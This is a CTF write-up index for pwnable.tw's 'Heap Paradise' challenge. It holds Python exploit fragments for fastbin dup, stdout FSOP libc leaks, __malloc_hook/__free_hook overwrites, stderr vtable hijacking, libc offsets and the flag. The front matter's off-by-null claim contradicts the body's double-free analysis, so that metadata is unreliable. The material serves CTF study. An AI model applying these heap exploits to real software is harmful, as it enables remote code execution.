---
tags:
  - off-by-null
  - fastbin-dup
  - io-file-exploit
platform: pwnable.tw
points: 350
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "An off-by-null single-byte overflow enables fastbin consolidation and duplicate allocation without a show function, leaking libc via _IO_2_1_stdout_."
proof-of-concept: no
---

# Heap Paradise — pwnable.tw (350 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10308`
>
> Flag: `FLAG{W3lc0m3_2_h3ap_p4radis3}`

## Challenge Overview

A minimalist heap menu binary (x86-64, Full RELRO, PIE, NX, Canary, FORTIFY) built against glibc 2.23 (no tcache). The menu provides only Allocate, Free, and Exit — **no view/print functionality**. All allocations are capped at `size <= 0x78`, restricting everything to the fastbin range. A global pointer array `ptr[16]` in `.bss` holds up to 16 allocations (slots are never reused after free).

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO         # GOT not writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
```

## Vulnerabilities

### V1 — Use-After-Free / Double-Free (Primary, Exploitable)

**Root Cause:** The `Free` function calls `free(ptr[index])` but **never sets `ptr[index]` to NULL**. Since slots are never cleared, the same index can be freed multiple times, and freed pointers remain accessible for re-allocation overlap.

```c
void Free() {
    long index = get_long();
    if (index <= 15)
        free(ptr[index]);     // ptr[index] NOT cleared → UAF + double-free
}
```

**Impact:** Classic fastbin double-free primitive. Enables fastbin duplication (A→B→A cycle) which leads to overlapping allocations and arbitrary fastbin fd pointer corruption.

### V2 — Signed Index Check (Minor, Unexploited)

The free index check uses `index <= 15` on a signed long. Negative indices could theoretically free arbitrary BSS pointers, but no solution uses this since the pointer array is at the start of writable BSS with nothing useful before it.

## Key Constraints

| Constraint | Impact |
|-----------|--------|
| `size <= 0x78` | All chunks are fastbin-sized (max chunk `0x80`). Cannot directly get unsorted bin libc pointers. |
| No view/print | Cannot read heap contents through the menu. Must use side-channel (FSOP stdout leak). |
| 16 slot limit | Slots are consumed on alloc, never reclaimed. Must complete exploit within 16 allocations total. |
| Full RELRO | GOT is read-only. Must use hook-based (`__malloc_hook` / `__free_hook`) or FSOP attacks. |

## Exploit Paths

All solutions follow a three-phase structure: (1) get a libc pointer onto the heap, (2) leak libc, (3) hijack control flow. They differ in leak technique and final target.

---

### Path A — Fastbin Dup → Fake Unsorted Chunk → stdout FSOP Leak → `__malloc_hook` Overwrite

**Used by:** ~90% of all solutions (81, 138, 216, 378, 564, 821, 1177, 2796, 5378, 7905, 8153, 9448, 13204, 17704, 22310, 26250, 31599, 34817, 40311, and exp.py)

**Phase 1 — Plant libc pointer on heap:**

1. **Fastbin dup** (double-free A→B→A) to get overlapping chunks. By writing a partial heap address as the `fd` pointer, allocate a chunk that overlaps another, gaining control over an adjacent chunk's size field.

2. **Forge a fake chunk** with `size >= 0x80` (typically `0xa1` or `0x91`) in the overlapping region. This size is above the fastbin max, so freeing it sends it to the **unsorted bin**.

3. **Free the forged chunk** → glibc writes `main_arena+0x58` (a libc address) into the chunk's `fd`/`bk` fields on the heap.

```python
# Typical Phase 1 pattern:
alloc(0x68, b'f'*0x10 + p64(0) + p64(0x71))        # 0 — embed fake chunk header
alloc(0x68, b'a'*0x10 + p64(0) + p64(0x31) + ...)   # 1 — embed fake next-chunk
free(0); free(1); free(0)                             # fastbin dup: 0→1→0
alloc(0x68, b'\x20')                                  # redirect fd to heap+0x20
alloc(0x68, b'\0'); alloc(0x68, b'\0')                # consume chain
alloc(0x68, b'\0')                                    # land on fake chunk at heap+0x20
free(0)
alloc(0x68, b'd'*0x10 + p64(0) + p64(0xa1))          # overwrite fake chunk size → 0xa1
free(5)                                               # → unsorted bin → libc ptr on heap
```

**Phase 2 — Leak libc via `_IO_2_1_stdout_` corruption (FSOP):**

4. The unsorted bin remainder (after splitting) or the freed chunk itself contains a `main_arena` pointer in its `fd` field. Using another fastbin dup, **partially overwrite** (2 bytes) this `fd` pointer to redirect it to `_IO_2_1_stdout_ - 0x43`.

5. At `stdout - 0x43`, the byte at offset `+0x8` is `0x7f` (from adjacent libc data), which passes glibc 2.23's fastbin size check for the `0x70` bin.

6. Allocate at `stdout - 0x33` and overwrite the `_IO_FILE` structure:
   - `_flags = 0xfbad1800` (or `0xfbad3887`) — set `_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING`
   - Clear `_IO_read_*` pointers
   - Set `_IO_write_base` low byte to `0x00` or `0x80` — ensures `_IO_write_base < _IO_write_ptr`

7. The next `puts()` call flushes `[_IO_write_base, _IO_write_ptr)`, **leaking libc pointers** from the stdout internal buffer (typically `_IO_2_1_stdin_` address).

```python
# Partial overwrite: only low 2 bytes known, bits 12-15 are guessed → 1/16 probability
low2 = p16((_IO_2_1_stdout_ - 0x43) & 0xFFFF)  # e.g., 0x25dd or 0x45dd
alloc(0x68, padding + p64(0x71) + low2)           # partial overwrite fd
alloc(0x68, b'\0')                                 # consume
alloc(0x68, b'\0'*3 + p64(0)*6 + p64(0xfbad1800) + p64(0)*3 + b'\x00')  # corrupt stdout
# → next puts() leaks libc
```

**Phase 3 — Overwrite `__malloc_hook` with one_gadget:**

8. With full libc base known, do a final fastbin dup. Set `fd = __malloc_hook - 0x23` (where offset `+0x8` has byte `0x7f` from `main_arena` data → passes fastbin size check).

9. Allocate at `__malloc_hook - 0x13`, write `0x13` bytes padding + `p64(one_gadget)` to overwrite `__malloc_hook`.

10. Trigger `malloc()` (send menu choice "1" + any size) → `__malloc_hook` fires → `execve("/bin/sh")` → shell.

```python
alloc(0x68, p64(__malloc_hook - 0x23))             # poison fastbin fd
alloc(0x68, b'\0')                                  # consume
alloc(0x68, b'\0')                                  # consume
alloc(0x68, b'\0'*0x13 + p64(one_gadget))           # overwrite __malloc_hook
# trigger:
sendline("1"); sendline("8")                        # malloc() → one_gadget → shell
```

**Reliability:** The Phase 2 partial overwrite requires guessing 1 nibble of ASLR (bits 12-15 of libc base). Success rate is **1/16 per connection** (~6.25%). Solutions wrap the exploit in a retry loop.

---

### Path B — FSOP via `_IO_2_1_stderr_` vtable hijack (Leakless)

**Used by:** Solution 2311

Instead of leaking libc and then doing a second fastbin attack, this approach performs **two** partial-overwrite fastbin attacks (both 1/16 probability each, so overall ~1/256):

1. First fastbin attack targets `_IO_2_1_stderr_`, overwrites its `_flags` to `";sh\0"` and partially overwrites `_IO_write_base` to point to `system`.

2. Second fastbin attack targets the middle of `stderr`, partially overwrites the **vtable pointer** to point to the crafted `system` address.

3. Trigger `_IO_flush_all_lockp` (via a deliberate double-free abort). The flushing code calls `stderr->vtable->__overflow(stderr)` which resolves to `system(stderr)`, and since `stderr->_flags` starts with `";sh\0"`, the shell command executes.

**Reliability:** ~1/256 per connection (two independent 1/16 guesses). Much slower than Path A but requires no leak at all.

---

### Path C — stdout vtable overwrite via `__free_hook`

**Used by:** Solutions 331, 378, 564, 821

A variant where after leaking libc via the stdout FSOP (same as Path A Phase 2), the exploit:

1. Uses a fastbin dup to allocate near `_IO_2_1_stdout_`'s vtable region.
2. Overwrites the vtable pointer or `__overflow` entry to point to `system`.
3. Triggers output (e.g., via menu prompt) which calls through the corrupted vtable → `system("/bin/sh")` or `system(stdout)` where `_flags` contains `";sh"`.

Alternative finish: Some solutions target `__free_hook` instead of `__malloc_hook`:

```python
# unsorted bin attack to write main_arena near __free_hook → create fake fastbin chunk
alloc(0x78, p64(0)*11 + p64(0x71) + p64(__free_hook - 0x33))
alloc(0x68, b"/bin/sh\x00")           # this chunk's content = "/bin/sh"
alloc(0x68, padding + p64(system))     # overwrite __free_hook
free(idx_of_binsh_chunk)              # free("/bin/sh") → system("/bin/sh")
```

---

### Path D — Double-Free Abort Triggers `__malloc_hook`

**Used by:** Solutions 17704, 31599, 34817

After overwriting `__malloc_hook` with one_gadget, instead of sending a normal malloc menu choice, trigger a **deliberate double-free**. The glibc abort handler internally calls `malloc()` (for error message formatting), which fires `__malloc_hook` → one_gadget → shell.

```python
# After __malloc_hook = one_gadget:
free(0); free(0)   # double-free → abort → malloc() internally → __malloc_hook → shell
```

## Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Double-free (fastbin dup) | V1: UAF / no pointer clear | Deterministic |
| Heap overlap / chunk forge | Fastbin dup + partial fd write | Deterministic |
| Fake unsorted bin chunk | Overlap → write size ≥ 0x80 → free | Deterministic |
| libc pointer on heap | Unsorted bin free writes main_arena | Deterministic |
| stdout FSOP leak | Partial overwrite fd → stdout-0x43 | 1/16 (nibble guess) |
| `__malloc_hook` overwrite | Fastbin dup → malloc_hook-0x23 (0x7f) | Deterministic after leak |
| Code execution | one_gadget via `__malloc_hook` or `system` via `__free_hook` | Deterministic after overwrite |

## Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
_IO_2_1_stdout_ = 0x3c4620
_IO_2_1_stdin_  = 0x3c38e0
_IO_2_1_stderr_ = 0x3c4540
__malloc_hook   = 0x3c3b10    # main_arena = __malloc_hook + 0x10
__free_hook     = 0x3c57a8
system          = 0x45390
one_gadgets     = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
```

## Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `81.md` | A | Fastbin dup → unsorted → stdout FSOP → `__malloc_hook` | Clean minimal exploit |
| `138.md` | A | Ruby exploit; same three-phase approach | Uses `_IO_2_1_stderr_+157` as fake chunk |
| `216.md` | A | Fastbin dup → stdout FSOP → `__malloc_hook` | Standard pattern |
| `331.md` | C | stdout FSOP → vtable overwrite → `system` | Hijacks stdout vtable instead of hooks |
| `378.md` | C | stdout vtable + FSOP → `system` via vtable | Uses `";sh"` in `_flags` |
| `564.md` | A+C | stdout FSOP → vtable overwrite + one_gadget | Two-stage vtable/hook approach |
| `821.md` | A+C | stdout FSOP → `__free_hook` via unsorted bin attack | Uses unsorted bin attack for `__free_hook` |
| `1177.md` | A | Fastbin dup → stdout FSOP → `__malloc_hook` | Local process exploit |
| `2311.md` | B | **Leakless**: dual partial overwrite → stderr vtable → `_IO_flush_all_lockp` | ~1/256 brute; no libc leak needed |
| `2796.md` | A | Standard three-phase | Concise implementation |
| `5378.md` | A | stdout FSOP → `__malloc_hook` | `FLAG{W3lc0m3_2_h3ap_p4radis3}` confirmed |
| `7905.md` | A | Detailed Chinese writeup; full phase breakdown | Best pedagogical write-up |
| `8153.md` | A | Chinese writeup; clean overlap analysis | Notes signed index bug |
| `9448.md` | A | Standard approach with retry loop | Clear heap layout diagrams |
| `13204.md` | A | Minimal exploit with retry decorator | Uses `0x3c3aed` for `__malloc_hook` fake chunk |
| `17704.md` | A+D | stdout FSOP → `__malloc_hook` → double-free abort trigger | Abort path for trigger |
| `22310.md` | A | Standard three-phase with bruteforce | Uses `0x45dd` partial overwrite |
| `26250.md` | A | Standard three-phase | Detailed heap layout comments |
| `31599.md` | A+D | stdout FSOP → `__malloc_hook` → double-free abort | Heap diagram in comments |
| `34817.md` | A | "fake unsortedbin, angelboy's leak, hijack malloc hooks" | Clean final exploit |
| `40311.md` | A | Standard three-phase; clean Python3 | Retry loop, concise |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (self-contained, no pwntools dependency) |
| `desc.txt` | Challenge description |
| `solution/*.md` | Community write-ups (71 solutions) |
